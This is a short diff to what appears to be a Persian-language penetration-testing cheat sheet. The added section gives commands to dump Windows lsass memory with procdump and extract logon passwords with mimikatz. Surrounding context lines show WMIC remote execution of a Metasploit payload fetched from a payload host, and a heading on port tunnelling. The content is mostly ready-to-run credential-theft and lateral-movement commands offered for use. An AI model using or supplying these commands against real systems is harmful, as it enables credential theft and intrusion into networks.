@@ -454,6 +454,14 @@ wmic /node: remote ip /user:domain\compromised user //password:password
 process call create "\ \ payload ip \test\msf.exe"
 ```
 
+## دریافت پروسس lsass و استخراج اطلاعات با mimikatz
+
+```text
+procdump.exe -accepteula -64 -ma lsass.exe  lsass.dmp
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords f
+```
+
 ## تونل 
 
 ### Fpipe - دریافت اطلاعات از پورت 1234 و انتقال به پورت 80 2.2.2.2
